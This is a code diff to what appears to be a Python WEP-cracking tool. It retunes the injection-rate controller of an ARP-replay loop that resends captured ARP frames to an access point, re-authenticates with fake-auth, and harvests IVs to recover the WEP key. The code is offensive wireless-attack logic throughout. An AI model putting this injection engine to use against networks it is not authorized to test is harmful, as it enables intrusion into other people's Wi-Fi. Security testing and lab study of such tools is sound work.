@@ -20,12 +20,14 @@ mistaken for a working replay). Once the AP echoes one, we lock on and keep
 replaying it. If a locked winner stalls (likely we got de-associated) we ask
 fake-auth to re-auth and keep the same seed rather than discarding it.
 
-Operating shape (deliberately SIMPLE): fixed 1-second windows. Each window we
-blast ``rate`` packets at the card's full speed, then sleep out the rest of the
-second (one ~1s sleep, immune to Windows' ~15ms timer granularity, unlike
-per-frame pacing) while the AP's rebroadcasts land. Count IVs gained that
-second, then a perturb-and-observe step nudges ``rate`` toward more IVs/s. No
-per-cycle pacing math, no idle-heavy small bursts capping the duty cycle.
+Rate control (climb-with-peak-memory, validated in scripts/wep_lab.py across
+SPOOFABLE / FIXED_MAC / NONE cards): each 2-second window (> the AP's ~1-2s
+relay lag) blasts ``_target`` injects at the card's full speed, then sleeps the
+remainder so the rebroadcasts have RX airtime. After each window it climbs
+``_target`` while the AP's echo rate rises, remembers the best (echo, target),
+and settles back to it once higher stops helping (re-probing occasionally). A
+card below the AP's relay ceiling climbs to all-gas; a fast one settles at the
+knee. The control signal is the AP-echo rate (``_rx_cb``), not the raw IV count.
 """
 
 from __future__ import annotations
@@ -68,19 +70,17 @@ class ArpReplayStats:
 
 
 class WepArpReplay:
-    """ARP-replay loop with patient candidate testing + per-second P&O rate."""
+    """ARP-replay loop: patient candidate testing + a climb-with-peak-memory inject-rate controller."""
 
-    # P&O rate controller over 1s windows. objective = IVs gained that second.
-    _WINDOW_S = 1.0
-    _RX_DUTY = 0.7          # cap the TX burst at this fraction of the window; the remainder is
-                            # guaranteed RX airtime so the AP's rebroadcasts (our IVs) are received.
-    _PO_STEP_PPS = 32.0
-    _PO_START_PPS = 100.0
-    _PO_MIN_PPS = 20.0
-    _PO_MAX_PPS = 1000.0
-    _PO_IMPROVE_EPS = 0.05  # Relative improvement deadband
-    _IVS_EWMA_ALPHA = 0.3   # EWMA smoothing of the per-window IVs/s before P&O acts on it.
-    _TRIAL_WINDOW = 2.5     # Time to keep testing one candidate before judging it (seconds).
+    # Climb-with-peak-memory rate controller (see scripts/wep_lab.py --strategy adaptive). Window is
+    # 2s (> the AP's ~1-2s relay lag) so a window's echoes are not smeared across separate bursts.
+    _WINDOW_S = 2.0
+    _CTRL_START = 100.0         # kickstart injects per window
+    _CTRL_GROW = 1.25           # multiplicative climb step
+    _CTRL_ECHO_EWMA = 0.5       # smoothing on the per-window echo rate the controller acts on
+    _CTRL_REPROBE_WINDOWS = 8   # windows to hold at the peak before re-probing the ceiling
+    _CTRL_MIN_TARGET = 20.0     # never drop the target below this (keep probing)
+    _TRIAL_WINDOW = 4.0     # Time to keep testing one candidate before judging it (seconds).
     _MIN_TRIAL_GAIN = 1     # Echoes needed to call a candidate replayable.
     _STALL_REAUTH_AFTER = 2.0
     _STALL_DEMOTE_AFTER = 6.0
@@ -113,14 +113,17 @@ class WepArpReplay:
         self._paused = False
         self._task: Optional[asyncio.Task] = None
 
-        # P&O rate-controller state (1s windows; rate = packets/window = pps).
-        self._rate = self._PO_START_PPS       # current target injection pps
-        self._rate_step = self._PO_STEP_PPS   # signed perturbation
-        self._po_prev_ivs_s = -1.0            # previous (smoothed) IVs/s
-        self._last_ivs_s = 0.0                # this window's RAW IVs/s
-        self._ivs_ewma = -1.0                 # smoothed IVs/s (what P&O acts on)
+        # Climb-with-peak-memory controller state (injects per window). _reset_rate_search seeds it.
+        self._target = self._CTRL_START
+        self._best_echo = 0.0
+        self._best_target = self._CTRL_START
+        self._echo_ewma = -1.0                # smoothed per-window echo rate the controller acts on
+        self._last_echo_rate = 0.0            # this window's raw echo rate
+        self._ctrl_misses = 0                 # consecutive no-improvement windows while climbing
+        self._ctrl_climbing = True
+        self._ctrl_since_probe = 0
 
-        self._echoes = 0  # AP-echo correlation
+        self._echoes = 0  # AP-echo correlation (the control + verdict signal)
 
         # Candidate under test/replay + its trial accounting.
         self._current: Optional[bytes] = None
@@ -178,8 +181,8 @@ class WepArpReplay:
 
     @property
     def target_pps(self) -> float:
-        """The P&O-chosen injection rate (the smooth controlled variable)."""
-        return self._rate
+        """The controller's chosen injection rate, packets/second (target injects / window)."""
+        return self._target / self._WINDOW_S if self._WINDOW_S > 0 else self._target
 
     # ---- Candidate selection ------------------------------------------------
 
@@ -288,15 +291,10 @@ class WepArpReplay:
         self._echoes += 1
 
     async def _burst_window(self, cand: bytes) -> int:
-        """One 1-second window: blast ``rate`` packets at the card's full speed,
-        then sleep out the rest of the second while the AP's rebroadcasts land."""
-        # Never let the burst eat more than _RX_DUTY of the window: the remainder is the RX
-        # airtime the AP's rebroadcasts (our IVs) need, and without it rx_reader drops them at
-        # its pending cap. raw_pps is the card's measured accept rate (0 on the very first window);
-        # the cap only applies to a real-time window (WINDOW_S>0), and never drops below 1 frame.
-        if self.stats.raw_pps > 0 and self._WINDOW_S > 0:
-            cap = self._RX_DUTY * self._WINDOW_S * self.stats.raw_pps
-            self._rate = max(1.0, min(self._rate, cap))
+        """One ``_WINDOW_S`` window: blast ``_target`` injects at the card's full speed, then sleep
+        the remainder so the AP's rebroadcasts (our IVs) have RX airtime. Returns the AP-echo gain
+        (the verdict + control signal). No fixed duty cap: the controller keeps ``_target`` bounded,
+        and a card that cannot inject ``_target`` within the window simply runs all-gas."""
         frame = self._build_replay_frame(cand)
         if frame is None:
             # Malformed capture: blacklist and move on.
@@ -307,8 +305,10 @@ class WepArpReplay:
         echoes_before = self._echoes
         t0 = time.time()
         sent = 0
-        for _ in range(int(round(self._rate))):
-            if not self._active:
+        for _ in range(int(round(self._target))):
+            # Stop if torn down, or (safety) if the burst has run 2x the window — a slow card at a
+            # high target just runs all-gas; the guard only bounds a pathological overrun.
+            if not self._active or (self._WINDOW_S > 0 and (time.time() - t0) >= 2 * self._WINDOW_S):
                 break
             try:
                 await self.iface.send_no_wait(frame)
@@ -317,9 +317,8 @@ class WepArpReplay:
             except Exception:
                 logger.exception(f"[WEP-ARP] failed to send frame during burst (sent={sent})")
                 break
-        send_dt = max(1e-3, time.time() - t0)   # burst only: the hardware cap
-        # Wait out the remainder of the 1s window
-        await asyncio.sleep(max(0.0, self._WINDOW_S - send_dt))
+        send_dt = max(1e-3, time.time() - t0)                    # burst only: the hardware cap
+        await asyncio.sleep(max(0.0, self._WINDOW_S - send_dt))  # listen: RX airtime for the echoes
         window_dt = max(1e-3, time.time() - t0)
         self.stats.cycles += 1
         self.stats.raw_pps = sent / send_dt           # card's burst speed
@@ -327,16 +326,9 @@ class WepArpReplay:
         self.stats.burst_size = sent
         gain = self.collector.unique_count(self.bssid) - ivs_before
         self.stats.last_gain = gain
-        raw_ivs_s = gain / window_dt
-        self._last_ivs_s = raw_ivs_s
-        # EWMA so P&O reacts to the trend, not the queue-drain spike.
-        a = self._IVS_EWMA_ALPHA
-        self._ivs_ewma = (
-            raw_ivs_s if self._ivs_ewma < 0
-            else a * raw_ivs_s + (1.0 - a) * self._ivs_ewma
-        )
-        # The verdict keys on echoes, not the IV delta
-        return self._echoes - echoes_before
+        echo_gain = self._echoes - echoes_before
+        self._last_echo_rate = echo_gain / window_dt  # the controller's objective
+        return echo_gain
 
     def _judge(self, gain: int) -> None:
         """Decide what to do with the current candidate based on its trial."""
@@ -389,35 +381,48 @@ class WepArpReplay:
             ))
 
     def _reset_rate_search(self) -> None:
-        """Reset the P&O rate controller to its start state. Used by start() and on winner-demote
-        so a stalled session re-searches from a low rate instead of staying pinned high."""
-        self._rate = self._PO_START_PPS
-        self._rate_step = self._PO_STEP_PPS
-        self._po_prev_ivs_s = -1.0
-        self._ivs_ewma = -1.0
+        """Reset the rate controller to its start state. Used by start() and on winner-demote so a
+        stalled session re-climbs from the low kickstart instead of staying pinned high."""
+        self._target = self._CTRL_START
+        self._best_echo = 0.0
+        self._best_target = self._CTRL_START
+        self._echo_ewma = -1.0
+        self._ctrl_misses = 0
+        self._ctrl_climbing = True
+        self._ctrl_since_probe = 0
 
     def _maybe_adjust_rate(self) -> None:
-        """Perturb-and-observe step, run once per 1s window"""
+        """Climb-with-peak-memory, once per window while replaying. Push ``_target`` up while the
+        (smoothed) AP-echo rate rises; remember the best (echo, target); when higher stops helping,
+        settle back to the best and hold, re-probing every ``_CTRL_REPROBE_WINDOWS``. echoes -> 0
+        drives ``_target`` toward the floor, never toward max (so a dead AP can't cause a runaway)."""
         if self.state != "replaying":
-            # No steady signal → reset the baseline + smoothing for next time.
-            self._po_prev_ivs_s = -1.0
-            self._ivs_ewma = -1.0
             return
-        measured = self._ivs_ewma        # smoothed IVs/s (damps queue spikes)
-        if self._po_prev_ivs_s < 0:
-            self._po_prev_ivs_s = measured   # first window: just set baseline
+        er = self._last_echo_rate
+        self._echo_ewma = er if self._echo_ewma < 0 else (
+            self._CTRL_ECHO_EWMA * er + (1.0 - self._CTRL_ECHO_EWMA) * self._echo_ewma)
+        self._ctrl_since_probe += 1
+        if self._ctrl_climbing:
+            if self._echo_ewma > self._best_echo * 1.03:    # higher helped: remember + keep climbing
+                self._best_echo = self._echo_ewma
+                self._best_target = self._target
+                self._ctrl_misses = 0
+                self._target *= self._CTRL_GROW
+            else:
+                self._ctrl_misses += 1                      # no gain; tolerate one lagged window
+                if self._ctrl_misses >= 2:
+                    self._target = self._best_target        # settle back at the peak
+                    self._ctrl_climbing = False
+                    self._ctrl_misses = 0
+                    self._ctrl_since_probe = 0
+                else:
+                    self._target *= self._CTRL_GROW
         else:
-            # Hill-climb: keep stepping the same direction ONLY while IVs/s genuinely improve.
-            # A flat or falling objective (including a dead 0) turns around, so we never chase a
-            # non-responsive AP up to max pps and starve our own RX window (0 < 0 used to never
-            # trip the old drop-only test, ramping monotonically to the cap).
-            improved = measured > self._po_prev_ivs_s * (1.0 + self._PO_IMPROVE_EPS)
-            if not improved:
-                self._rate_step = -self._rate_step
-            self._po_prev_ivs_s = measured
-        self._rate = min(
-            self._PO_MAX_PPS, max(self._PO_MIN_PPS, self._rate + self._rate_step)
-        )
+            self._target = self._best_target                # hold at the peak
+            if self._ctrl_since_probe >= self._CTRL_REPROBE_WINDOWS:
+                self._ctrl_climbing = True                  # re-probe the ceiling
+                self._ctrl_since_probe = 0
+        self._target = max(self._CTRL_MIN_TARGET, min(self._target, self._best_target * 4 + 200))
 
     # ---- Logging ------------------------------------------------------------
 
